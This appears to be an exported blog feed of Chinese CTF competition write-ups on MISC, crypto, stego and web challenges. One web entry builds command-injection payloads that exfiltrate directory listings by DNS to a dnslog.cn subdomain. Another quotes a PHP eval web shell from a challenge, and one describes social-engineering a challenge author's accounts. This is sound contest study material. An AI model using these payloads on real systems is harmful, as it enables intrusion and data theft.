&quot;SAM\\Domains\\Account\\Users\\Names&quot;\n\n\n\n在最后发现可疑net1.exe，\nflag{45321c07f425d915c55424957353dd07}\nSlowloris\n1)小白做法为，\n统计-》流量图-》遍历所有ip\n\nmd5加密\nslowloris/195.8.178.227\n得到flag\nflag{3fc9d4a929cb690728d2b76c76483abe}\n2)一般做法为：Slowloris攻击为大流量攻击，通过流量包查看哪两个ip之间有频繁交互即可锁定\n","tags":["challenge","MISC"]},{"title":"2021红帽杯","url":"/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/","content":"2021红帽杯\n\n签到\n根据文件名提示，\n把txt拖进010editor，\n更改编码方式为【EBCDIC】\nflag{we1c0me_t0_redhat2021}\ncolorful code\n附件得到两个data\n一个全是数字，一个是十六进制\n结合题目【colorful】\n猜测为图片隐写\n1）如何形成图片data2开头为【000000】\n\n猜测为RGB，相当于字典\n而data1为索引值，数字对应data2中的第几组数据。\n接下来是长宽的问题\n尝试了很多方式，\n发现data1的长度为7068，微调后发现【7067=37*191】\n脚本如下\nfrom PIL import Imageim &#x3D; open(&quot;data1&quot;,&quot;r&quot;)mark &#x3D; im.readline().split(&#39; &#39;)print(mark)print(len(mark))c &#x3D; [(0,0,0),(0,0,192),(0,255,255),(0,255,0),(255,192,255),(255,192,192),(192,192,255),(192,192,0),(255,0,255),(255,0,0),(192,0,0),(192,0,192),(255,255,255),(255,255,0),(255,255,192),(0,192,0),(0,192,192),(192,255,255),(192,255,192),(0,0,255)]pic &#x3D; Image.new(&quot;RGB&quot;,(37,191))k&#x3D;0for i in range(37):    for j in range(191):        pic.putpixel((int(i),int(j)),c[int(mark[k])])        k +&#x3D; 1pic.save(&#39;flag.png&#39;)\n得到png\n\n找到解密网站https://www.bertnase.de/npiet/npiet-execute.php\n得到flag\n\n88842f20-fb8c-45c9-ae8f-36135b6a0f11\n加flag头上交\n","tags":["challenge","MISC"]},{"title":"DNSlog盲注","url":"/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/","content":"DNSlog盲注\n题目源码如下：\n&lt;?phperror_reporting(0);if(isset($_GET[&quot;Ginkgo&quot;]))&#123;    $c &#x3D; $_GET[&quot;Ginkgo&quot;];    if(!preg_match(&quot;&#x2F;flag|wget|sleep|socket|sock|perl|ruby|curl|php&#x2F;i&quot;, $c))&#123;        shell_exec(&quot;ping -c 3 &quot;.$c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; ?&gt;\n分析：\n传入变量Ginkgo\n赋值给变量c\n判断变量c是否等于&quot;/flag|wget|sleep|socket|sock|perl|ruby|curl|php/i&quot;\n若不一致则执行\nping -c 3 $c\n简单学习了一下http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/\n在pdsdt师傅的指导下\n简单捋了下最终需构造的命令如下\nping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 0-80&#96;.DNSLog.cn\n1）\n为解决无法回显的问题，需要一个介质来接收返回的信息，\nDNSLog.cn中Get SubDomain,\n得到一个dnslog的子域名\n在自身服务器中执行命令后\nping -c 3 6t775q.dnslog.cn\n能在DNSLog的Refresh Record中看到自身的ip\n这意味着咱们已经能够利用这种方式得到回显\n2）\n进一步构造\nping -c 3 &#96;ls &#x2F;&#96;.bet8m1.dnslog.cn\n空格问题需要绕过\nping -c 3 &#96;ls &#x2F;|base64&#96;.bet8m1.dnslog.cn\n但直接dump出来出现乱码\n问题在于按行显示的格式问题\n3）\nhttps://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u\nhttps://www.runoob.com/linux/linux-comm-cut.html\nping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 40-80&#96;.bet8m1.dnslog.cn\n截取第一行第40到80个字符，\n注意字符的重复和替代情况\n","tags":["WEB"]},{"title":"F5杯","url":"/2021/04/24/F5%E6%9D%AF/","content":"ctfshow-F5杯\n\n1：取IDAT,IHDR部分重新排列\n1）IHDR领先\n2）IDAT尝试重新排列\n3）前后补全\nJust Another 拼图\n\n史上最简单的拼图misc题！贴心到连序号都已经全部标注好，令gaps彻底失业、眼科医院纷纷倒闭！唯一的问题是图里好像没有flag？这点小问题应该无关紧要吧。\n感谢@出题人说不要署名 师傅供题。\n\nstrings *.jpg | grep IDAT\n\n\n\n2：数列问题\n填字游戏\n\n这什么鬼填字游戏啊，到底要填什么字啊。\n感谢@出题人说这次匿名 师傅供题\n\nhttp://oeis.org/\n\n\n\n通过搜索找到对应数字\n65 69 97 53 121 70 108 52 103# AEa5yFl4g\n3\n\n两行代码一纸情书\n\nA very simple dll, I promise you can get flag in seconds\n感谢@Y4tacker师傅供题\n\n\n搜索ctf得到一大串字符串\n一把梭后发现base64末尾出现‘==’\n连续解码后得到flag\n","tags":["challenge","MISC"]},{"title":"GeekChallenge2020","url":"/2020/10/17/GeekChallenge2020/","content":"GeekChallenge2020\n10.17\n\nWeb\n朋友的学妹\nview-source:查看网页源码\n\n朋友的学妹\n\n与妹子单独相处一会儿吧\n\n\n网页了解到可以使用view-source:可以看到网页源代码，执行命令\nview-source:&lt;url&gt;\n得flag.\nEZwww\n备份文件\n\nEZwww\n\n提示：备份是个“好🤺”习惯\n\n\n提到备份文件，想起前不久刷过的GITHUB上的题，跑过去看了一眼，（Web-Web前置技能-信息泄露-备份文件下载），想起了当时的思路👇\npython3 dirsearch.py -u &lt;url&gt; -e *\n得👇\n\n搜索网页http://47.100.46.169:3901/www.zip可得一个压缩包，flag!!!.txt里写着\nSYC{th1s_1s_4_f4ke_fl4g}\n好叭不是。\n观察压缩包里index.php，\n&lt;?php$key1 &#x3D; $_POST[&#39;a&#39;];$key2 &#x3D; base64_decode(&#39;c3ljbDB2ZXI&#x3D;&#39;);if($key1 &#x3D;&#x3D;&#x3D; $key2)&#123;    &#x2F;&#x2F;this is a true flagecho &#39;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;&#x2F;p&gt;&#39;;&#125;?&gt;\n由此构造a=sycl0ver，得flag。\nEZgit\nGit泄露\n\nEZgit\n\n当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,嘿嘿嘿。。。\n\n\n同上一题，可得👇\n\n观察得一/.git/\n想到曾经GITHUB里的（Web-Web前置技能-信息泄露-Git泄露）,通过\npython2 GitHack.py &lt;url&gt;\n进入dist里\ngit log\n\ngit diff \n\n得flag.\n\nRE\nNo RE no gain\n\nNo RE no gain\n\n请在招新群的文件和博客文章了解逆向工程;https://down.52pojie.cn/Tools/Disassemblers/IDA.txt 不知道下载哪个的话就下载IDA_Pro_v7.0_Portable.zip;Hint 3: IDA F5 反而找不到关键位置\n\n\n找_main函数，直接看到flag.\n\nMISC\n壮言壮语\n\n壮言壮语\n\n佛曰：豆梵能佛冥謹沙怯隸道等孕喝伽訶恐奢耶尼殿怯怖奢三缽南怛缽娑皤寫數皤究呐者醯皤勝孕皤顛皤耶夜哆悉侄羯涅悉怯老若俱勝菩知菩所蘇奢以梵世心亦呐耨夷哆至哆醯即波怯明除怯闍怯集怯尼明皤實怯一心缽呼侄羯夢室諳耨呐提迦梵都都呐孕礙諳那呐彌豆缽智遮諳槃提伽俱穆離冥伊冥那藐罰摩迦諳有諳盡即怯多逝侄婆冥涅神\n\n\n在线网站解密得flag。\n\nCrypto\n二战情报员刘壮\n\n二战情报员刘壮\n\n你能知道刘壮在说什么？得到的flag包裹上SYC{} .-…/.----/…-/–…/…/…-/…-/-./–./…–.-/…/…–.-/–…/.----/-.–/.----\n\n\n摩斯密码解密得flag。\n铠甲与萨满\n\n铠甲与萨满\n\nYEI{roafnagtmroafnagtm_hgtmhgtmhgtm}\n\n\n在线网站也可。\n\nGeekChallenge2020\n10.18\n\nWeb\n刘壮的黑页\n\n刘壮的黑页\n\n没有人比我刘壮更懂请求方式\n\n\n发现PHP代码\n&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$username &#x3D; $_GET[&#39;username&#39;];$passwd &#x3D; $_POST[&#39;passwd&#39;];if ($username &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $passwd &#x3D;&#x3D;&#x3D; &#39;syclover&#39;) &#123;    echo $flag;&#125;\n构造相应传参方式\n\n得flag.\nMisc\n来拼图\n\n[来拼图]\n\n题目附件：https://pan.baidu.com/s/1hee3eFvDDA9lpdlElHtZLA 提取码: gy89\n\n\n就，纯拼图。跟之前一场比赛类似，相对简便的方法是按文件大小排序后，再进行手动筛选👇\n\n\nGeekChallenge2020\n10.19\n\nWeb\n[flagshop]\n\n题目地址: http://173.82.206.142:8005/ 题目描述： 你给我钱,我给你flag,就是这么简单;1.No sessionid!Don’t Try to be admin(robot?) 2.Do you know csrf?\n\n就直接购买FLAG??\n[我是大黑客]\n\n题目地址：http://39.106.144.160:100/\n\n&lt;?phpeval($_POST[&#39;liuzhuang&#39;]);&#x2F;&#x2F;谁是大恶人 那必定是我liuzhuang&#x2F;&#x2F;当你的服务器看到 0xliuzhuang 就知道要买台新机器了?&gt;\n\nCrypto\n成都养猪二厂\n\n[成都养猪二厂]\n\n题目地址：https://share.weiyun.com/FdTTmTP7 题目描述：v先生家里蛮大的，还有很多啤酒。v先生之所以能过上这样快哉的生活可能是因为他的养猪场厂围上了高高的栅栏\n\n\n根据题目，猪圈密码+栅栏密码。\n猪圈密码本来还猜测图片到底那边为正面，故试了两个版本，转成小写后分别为xbhpmvaptacivbeegjapvv和ssyirceehsagiulisolbhy\n栅栏密码在线解密,想起之前接触过W型，结合HINT:\n...(嘟哝)..(int)sth_import &#x3D; 889464&#x2F;114514;....(嘟哝)...\n解密得类似有意义字符的字符串，分割后提交，正确.\n韡髻猊岈\n\n[韡髻猊岈]\n\n题目地址：https://share.weiyun.com/Y5qldy3K 题目描述：v先生最近说话越来越奇怪了\n\n\n傻逼了，昨天就知道是维吉尼亚了。在刷Pico的时候遇到一个超级好用的在线网站，出了明文\nModern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions, making such algorithms hard to break in SYC there is no tears in vigenere\n结果愣了一天，今天突然灵机一动，发现flag就是SYC there is no tears in vigenere加{}和下划线。淦\n\nGeekChallenge2020\n10.20\n\nMISC\n秘技·反复横跳\n\n[秘技·反复横跳]\n\n题目附件：链接：https://share.weiyun.com/6oCZShYV 密码：114514 对图片…使用binwalk拳吧!\n\n\nbinwalk，啥都没有。观察了一波手头关于图片的工具，准备一把梭。\n运气好，第一个就碰对了，foremost.\n分离出一张处理过的二维码，PS后得flag。\n\nGeekChallenge2020\n10.20\n\nCrypto\n[规规矩矩的工作]\n\n题目地址：https://share.weiyun.com/RPDWr2WQ 题目描述：wlz当年玩蹦蹦蹦为了抽希尔氪了很多钱\n提示：hint1:让我看看是谁不好好上线代课？hint2:decode程序可能加载的有点慢并且请在命令行内运行\n\n想了好久，明确该加密方法为希尔密码。\nkey_encrypt1 1 11 2 31 3 6enc：121210\n但直接加密后为(34 66 108),不对。\n又想了好久，还怕自己算错了，找了个在线网站发现应该decode(😂)，先求逆矩阵，得\n\n与密文相乘得\n\nmod26后得明文KEY,输入exe得flag。\n[babyRSA]\n\n题目地址：https://share.weiyun.com/lbPVqZN2 题目描述：因为每晚都有小毛贼翻过v先生的栅栏去对猪圈搞破坏，v先生的养猪场不久就倒闭了。失落的v先生感觉不会再爱这个世界了。在他起身去找工作之前留下了一张纸条。\n\nfrom Crypto.Util.number import *from gmpy2 import *from secret import p,flagflag &#x3D; bytes_to_long(bytes(flag,encoding&#x3D;&#39;utf-8&#39;))q &#x3D; getPrime(1024)n &#x3D; q*pphi_ &#x3D; (p-1)*(q-1)e &#x3D; 0x10001d &#x3D; invert(e,phi_)c &#x3D; (pow(flag, e, n))print(long_to_bytes(pow(c, d, n)))print((c,q,n))&#39;&#39;&#39;out put(177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194, 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043, 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149)&#39;&#39;&#39;\n已知pqenc,跑脚本得flag\n#! python3import gmpy2import libnump &#x3D; gmpy2.mpz(166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043)q &#x3D; gmpy2.mpz(1145143)e &#x3D; 65537c&#x3D; 177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194n&#x3D; 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149n&#x3D;p*qs &#x3D; (p- 1) * (q - 1)d &#x3D; gmpy2.invert(e,s)m &#x3D; pow(c,d,n)print(libnum.n2s(pow(c, d, n)))\n\nGeekChallenge2020\n10.26\n\nCrypto\n[childRSA]\n\n题目地址：https://share.weiyun.com/ht7XxhWr 题目描述：v先生有一边听广播一边码字的坏习惯。为了保证coding工作的正确性，v先生今天把数据多算了几遍\n\n给了一段代码一段数据。\n题目地址：https:&#x2F;&#x2F;share.weiyun.com&#x2F;ht7XxhWr 题目描述：v先生有一边听广播一边码字的坏习惯。为了保证coding工作的正确性，v先生今天把数据多算了几遍\n根据之前的经验，代码八成是用来解释此种加密方法的，只抓重点信息，e=3即可\n上低加密指数广播攻击脚本\n#!&#x2F;usr&#x2F;bin&#x2F;env pythone&#x3D;3n1 &#x3D; 0xe096219878f492bcdb2a2d03995521e7a65125733bae18e7d0005e35343fea3653698de60231d29b2d1b44a0b4ffd3183855b9042275f769e1702fa8843062df0938821db0258af40ab3cda8e54eb6ac826d545df91dfe76266cb01b1d6fad39e6ef13ce730c1c2395136b0bbdf22c6b0daba63701d71c6ae70d4e06935b9941c1 &#x3D; 0xff24bddc5a7b327535af92dba58c5d62a22d542e6ba1df6f91c98c7563d8e48e770fb623bfcc2f09ed49788293306ff709670b225da32ea134422d5e403b11c39ef6b144f96b2fe94b3aa136432ecea86a4069a4cb0b4d8570edb3fb5bb2cf0693184ef0c589887b012ebe6ea94e854a71a7eb768133d15e784e388976877dbn2 &#x3D; 0xa36b15a395edf3e99927f658e22d5f4aefd83434972c96cca5242a1aaa517ad83739451269723092dd9e73c00682dd3bbd74a985546def88196119b6d57b397283bc7b8b6029916df84284bec1725f6e5d3d29042af685c508a58ab6fb4e5bfeb326ae49330e3f4426abc1860ca4412feb976ee571075a47b854c9a6f5f0ebffc2 &#x3D; 0x895f8283e2200bab1bf938ce3b5e42147b53a5178e436ea0b64a2380ba99776d5ba8046ef722858b20d9650ee68c09e905030f1634e0b32397b7b12236a5a301e5923a294ef1bdf16458f4fc8677370ce2ce3d0fd957da7466e5b104191d454455917147f3187b758c1c468db1b35514391e5b36bd1ac39e91bbb24fdbc07872n3 &#x3D; 0x9d4732db2539d1166dc6865670be11951bf49295bc8c472f34682a0fb7f2b3ba96dcfa1945c2e4685dfeae5255abe2ab3b7fb2282971bb16ce02d14082f71755e8a65c956e114336914a409a9f1158fb362a92c4e169fa3c460ea26fb5c6693447b14f1c3156a2d9308dd993d7ea708a00ad149fb77109d8a5f77de1703ba249c3 &#x3D; 0x3bead3d6760bff4de22562978d4722bb21ee4792ebdb32703b6df9ff5176e033e97ad8fc81467f4b3df7bd4e8bcae09462f3eca93a3da1cd9d7e8de3e464471fdd0b70112c1c738b0daa2a37a65331eaa8954b81b410f62a0280da32eb3e305782d5f774d814ca0adb13344687387cf72657dc21724bcf69da810d7635b99467def chinese_remainder(n, a):    sum &#x3D; 0    prod &#x3D; reduce(lambda a, b: a*b, n)    for n_i, a_i in zip(n, a):        p &#x3D; prod &#x2F; n_i        sum +&#x3D; a_i * mul_inv(p, n_i) * p    return sum % proddef mul_inv(a, b):    b0 &#x3D; b    x0, x1 &#x3D; 0, 1    if b &#x3D;&#x3D; 1: return 1    while a &gt; 1:        q &#x3D; a &#x2F; b        a, b &#x3D; b, a%b        x0, x1 &#x3D; x1 - q * x0, x0    if x1 &lt; 0: x1 +&#x3D; b0    return x1def find_invpow(x,n):    &quot;&quot;&quot;Finds the integer component of the n&#39;th root of x,    an integer such that y ** n &lt;&#x3D; x &lt; (y + 1) ** n.    &quot;&quot;&quot;    high &#x3D; 1    while high ** n &lt; x:        high *&#x3D; 2    low &#x3D; high&#x2F;2    while low &lt; high:        mid &#x3D; (low + high) &#x2F;&#x2F; 2        if low &lt; mid and mid**n &lt; x:            low &#x3D; mid        elif high &gt; mid and mid**n &gt; x:            high &#x3D; mid        else:            return mid    return mid + 1flag_cubed&#x3D;chinese_remainder([n1,n2,n3],[c1,c2,c3])flag&#x3D;find_invpow(flag_cubed,3)print &quot;flag: &quot;,hex(flag)[2:-1].decode(&quot;hex&quot;)# flag:  theoretical_computer_scientist_johan_torkel_hastad\n得flag:SYC{do1ng_thre3_things_At_once_i5_not_s4fe}\n[Simple calculation]\n\n题目地址：https://share.weiyun.com/EooKNpCi 题目描述：也许能在大一那本紫书上找到算法灵感hint:“The solution of system of linear congruence equations can be provided by the Chinese remainder theorem”\n\n\n尝试编写脚本：\nwin&#x3D;0for s0 in range(0,27):    for s1 in range(0,27):        for s2 in range(0,27):            for s3 in range(0,27):                for s4 in range(0,27):                    for n in range(0,10):                        if(s0*1+s1*1+s2*1+s3*1+s4*1&#x3D;&#x3D;n*26+3):                            win&#x3D;win+1                            break                        #print(&#39;1:&#39;,s0,s1,s2,s3,s4)                    for n in range(0,10):                        if(s0*1+s1*1+s2*1+s3*3+s4*5&#x3D;&#x3D;n*26+7):                            win&#x3D;win+1                            break                            #print(&#39;2:&#39;,s0,s1,s2,s3,s4)                    for n in range(0,10):                        if(s0*1+s1*2+s2*2+s3*3+s4*3&#x3D;&#x3D;n*26+1):                            win&#x3D;win+1                            break                            #print(&#39;3:&#39;,s0,s1,s2,s3,s4)                    for n in range(0,10):                        if(s0*1+s1*2+s2*5+s3*3+s4*1&#x3D;&#x3D;n*26+1):                            win&#x3D;win+1                            break                            #print(&#39;4:&#39;,s0,s1,s2,s3,s4)                    for n in range(0,10):                        if(s0*1+s1*2+s2*1+s3*2+s4*1&#x3D;&#x3D;n*26+20):                            win&#x3D;win+1                            break                            #print(&#39;5:&#39;,s0,s1,s2,s3,s4)                    if(win&#x3D;&#x3D;5):                        print(s0,s1,s2,s3,s4)                        print(chr(s0+65),chr(s1+65),chr(s2+65),chr(s3+65),chr(s4+65))                    win&#x3D;0\n出结果：\n(6, 4, 18, 13, 14)(&#39;G&#39;, &#39;E&#39;, &#39;S&#39;, &#39;N&#39;, &#39;O&#39;)(19, 4, 18, 13, 1)(&#39;T&#39;, &#39;E&#39;, &#39;S&#39;, &#39;N&#39;, &#39;B&#39;)\n尝试了第二个，flag正确！\n\nGeekChallenge2020\n10.27\n\nMISC\n[吉普赛的歌姬]\n\nQQ:2411194883\n\n这道题让我一度放弃。社工也太复杂了叭，我是废物……\n根据简介，找到第一个QQ，进去逛了一圈，①发现两个加密的相册，猜测那个名为“你想要的”里面应该有东西。②有一条说说的内容是：身为一个老年人怎么能不玩贴吧\n来贴吧和我一起玩吧：DJ南方\n于是找到本次比赛的学校的贴吧，搜索ID，找到用户：DJ南方。他发布的一个帖子为：伪·Nightcore\n网易云的一个电台\n最喜欢里面的一首吉普赛歌姬\n大家也可以来听呀，可能里面有你要的答案。怕你们找不到 这个主播的id是”不知道怎么吐槽了“的快来和我一起听歌吧。\n打开网易云，找到该电台，该首歌：伪 Nightcore - Gypsy Bard，评论中出题人说：我的密码是姓名首字母+生日\n那么问题来了，师傅的姓名是啥，生日又是啥呢。\n直接在列表里搜索出题人x1hy9，进空间逛了一圈，啥都没有。\n接下来就是毫无头绪了，索性队友Google了出题人的ID，找到了博客👇\n\n原来简介里QQ的昵称就是师傅的姓名（原来师傅的名字这么诗意……\n结合个人资料里的生日信息，得到相册密码，解开相册，那道flag。\n老折磨王了。\n","tags":["challenge"]},{"title":"ISCC2021","url":"/2021/05/04/ISCC2021/","content":"ISCC2021\n\n练武题\nRetrieve the passcode\n\nScatter说他能解开这个古怪的密码，你呢？来试试吧！\nFlag格式：ISCC{XXX}，XXX为小写字符串，不包括空格\n\n得到【scatter.txt】【computer.rar】\n观察txt\n1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;\n结合搜索得知scatter为一种Python绘图函数\n2、scatter（X，Y，S）S确定每个标记的面积。 S可以是与X和Y相同长度的矢量或标量。如果S为空，则使用默认大小，如果S是标量，则MATLAB绘制所有标记的大小相同。如果S是矢量，则分别对应为X、Y所确定圆的大小；如scatter([11 12 13 14],[14 15 26 27],[20 25 100 38]);————————————————版权声明：本文为CSDN博主「阿卡蒂奥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;akadiao&#x2F;article&#x2F;details&#x2F;73656067\nimport matplotlib.pyplot as pltdef scatter():    file &#x3D; open(&quot;scatter.txt&quot;, &quot;r&quot;)    text &#x3D; file.readlines()[0]    ch &#x3D; text.split(&quot;;&quot;)    x &#x3D; []    y &#x3D; []    for i in ch:        x.append(float(i.split(&#39;:&#39;)[0]))        y.append(float(i.split(&#39;:&#39;)[1]))    plt.scatter(x, y)    plt.show()scatter()\n得到\n\n压缩包密码【365728】\n得到【computer.pdf】莫斯电码\n-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. - .... . ..-. .-.. .- --. .. ...-.-. .... .- .-.. .-.. . -. --. . .. ... -.-. -.-. - .-- --- --.. . .-. --- - .-- --- --- -. .#CONGRATULATIONTHEFLAGIS#CHALLENGEISCCTWOZEROTWOONE\n然后就开始测格式，结果flag是两句话全输😂\n海市蜃楼-1\n\n或许你看到的只是海市蜃楼…\n\nword直接转zip\n解压看内容\n【ISCC\\mirage-1\\海市蜃楼-1\\海市蜃楼-1\\word\\document.xml】\n我的折扣是多少\n\n小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？\n\n得到【give.exe】【me.zip】【discount.mp3】\n【give.exe】\n\npass1&#123;\\u006b\\u0072\\u0077&#125;# unicode-》krw\n【me.zip】\n加密压缩包\n010结尾看到base\ncGFzczJ7Z2NjNjY2fQ&#x3D;&#x3D;# pass2&#123;gcc666&#125;\n结合两个pass解压得到\neW91Zm91bmRtZT8&#x3D;# youfoundme?\n【discount.mp3】\nmp3想到mp3stego\ndecode -X -P youfoundme? discount.mp3# ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#125;# ISCC&#123;Yourdiscount2.15&#125;\n擂台题\n小明的表情包\n\n放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串凯撒密码“AVARGRRA AVARGL AVAR”中，你能帮小红得到小明的表情包吗？\n\n加密压缩包，根据提示为出生日月年，\n凯撒密码为【NINETEEN NINETY NINE】\n解密失败\n尝试爆破，得到密码【07071999】\njpg格式有误，补全jpg文件头【FFD9FFE0】\n得到flag\n真作假时假亦真\n\n浅韵姐姐第一次参加ISCC，但没有很多CTF工具，为此她很苦恼。\n你能切身体会一下吗？\n附件下载链接：https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw\n提取码：a0oh\n\n得到download.wav\n末尾的莫斯电码【ISCC:HEYHONEY,AREYOULOOKINGFORTHEFUCKINGFLAGNOW?】\n丢进010editor发现png文件头，手动分离\n得到一张二维码付款码\nkali里exiftool得到\nroot@TyrantK:~&#x2F;桌面# exiftool Untitled1.png ExifTool Version Number         : 11.92File Name                       : Untitled1.pngDirectory                       : .File Size                       : 288 kBFile Modification Date&#x2F;Time     : 2021:05:04 15:44:32+08:00File Access Date&#x2F;Time           : 2021:05:04 16:06:45+08:00File Inode Change Date&#x2F;Time     : 2021:05:04 16:06:44+08:00File Permissions                : rw-------File Type                       : PNGFile Type Extension             : pngMIME Type                       : image&#x2F;pngImage Width                     : 1242Image Height                    : 1704Bit Depth                       : 8Color Type                      : RGB with AlphaCompression                     : Deflate&#x2F;InflateFilter                          : AdaptiveInterlace                       : NoninterlacedPixels Per Unit X               : 2874Pixels Per Unit Y               : 2874Pixel Units                     : metersXMP Toolkit                     : Adobe XMP Core 6.0-c002 79.164488, 2020&#x2F;07&#x2F;10-22:06:53Creator Tool                    : Adobe Photoshop 22.0 (Windows)Create Date                     : 2021:05:03 00:55:27+08:00Modify Date                     : 2021:05:03 00:59:09+08:00Metadata Date                   : 2021:05:03 00:59:09+08:00Format                          : image&#x2F;pngColor Mode                      : RGBICC Profile Name                : sRGB IEC61966-2.1Instance ID                     : xmp.iid:08dbb1cf-06a6-6147-a19e-3c30c111887dDocument ID                     : adobe:docid:photoshop:0cf82e22-bc60-394b-9808-1ec5719e29bcOriginal Document ID            : xmp.did:94a58657-d199-9a45-bb13-6a6d55604521Text Layer Name                 : ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ずText Layer Text                 : ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ずHistory Action                  : created, savedHistory Instance ID             : xmp.iid:94a58657-d199-9a45-bb13-6a6d55604521, xmp.iid:08dbb1cf-06a6-6147-a19e-3c30c111887dHistory When                    : 2021:05:03 00:55:27+08:00, 2021:05:03 00:59:09+08:00History Software Agent          : Adobe Photoshop 22.0 (Windows), Adobe Photoshop 22.0 (Windows)History Changed                 : &#x2F;Image Size                      : 1242x1704Megapixels                      : 2.1\n一开始以为是存在乱码，010editor，exiftool，以及图片增高都得到了字符串【ポ④ωаиɡ锗榮燿棑位笩╇Ｑ㈠⒌2肆⒌⒌23㈦2ず】\n确认有东西，开始辨认【xx王者荣耀xx+Q1524552372】\n开始社工\n\n这是最离谱的，居然不是flag\n于是进入空间，在相册里发现了\n\n同样是010模板查看\n得到\nhttps:&#x2F;&#x2F;wwa.lanzous.com&#x2F;iNVbsoqrz8fMTVDQw&#x3D;&#x3D;\n下载得到txt\n\n社会主义核心价值观加密/解密\nhttp://www.atoolbox.net/Tool.php?Id=850\n\n卡住\n因为txt里【你会算这笔帐吗？】\n尝试相加，失败\n尝试词频，失败\n最后【中文数字为黑，阿拉伯数字为白，25*25】转二维码\n得到\n\n","tags":["challenge","MISC"]},{"title":"MISC-3","url":"/2021/03/22/MISC-3/","content":"simple\n\n41\n2021年“春秋杯”新年欢乐赛【十二宫的挑衅】\n\n但愿你能解出密文，不然我就会继续犯罪:)\n本题获取flag提交前请加上flag{}\n\n通过查询发现是历史真实案件改编，根据新闻报道，对以下符号做如下处理\n1）将图片中的符号一一放入excel中\n2）按报道对符号进行处理\n\n3)将符号放入txt中，利用AZdecrypt1.19\n\nflag&#123;WUUHUUTAKEOFF&#125;\n42\n很好的色彩呃？\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n\n根据题目提示：颜色\n打开PS，取色器提取颜色的十六进制\n\n分别为\n8b8b618b8b618b8b708b8b6a8b8b658b8b73&gt;&gt;6161706A6573HEX&gt;&gt;aapjes\nflag{aapjes}\n43\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n得到photo.dat，与0x33异或\ndata &#x3D; open(&quot;photo.dat&quot;,&#39;rb&#39;)strs &#x3D; data.read()flag &#x3D; open(&quot;1.jpg&quot;,&#39;ab+&#39;)for i in strs:    flag.write(bytes([i ^ 0x33]))\n得到一张运营商的定位\n根据LTE可以定位基站地址http://www.gpsspg.com/bs.htm\nflag{桂林电子科技大学花江校区}\n妙啊\n44\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n一张二维码，扫码得\nhttps:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m&#x3D;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs&#x3D;n&amp;form&#x3D;QBRE&amp;sp&#x3D;-1&amp;sc&#x3D;0-38&amp;sk&#x3D;&amp;cvid&#x3D;2CE15329C18147CBA4C1CA97C8E1BB8C\n直接搜索无所得\n观察得，102，108，97，103等老朋友\n十进制转ascii\nurldecode\nflag&#123;5d45fa256372224f48746c6fb8e33b32&#125;\n45\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n明显图片中存在一块类似二维码的黑白块\n\n考虑转换为二进制\n001100010011001000110011001101000011010100110110001101110011100000\n转换为ascii失败\n转换为字符串https://www.qqxiuzi.cn/bianma/erjinzhi.php\nflag&#123;12345678&#125;\n46\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\nMy brother likes esoteric programming. He sent me this file but I don&#39;t see what it is for. Could you help me ?[GFlag 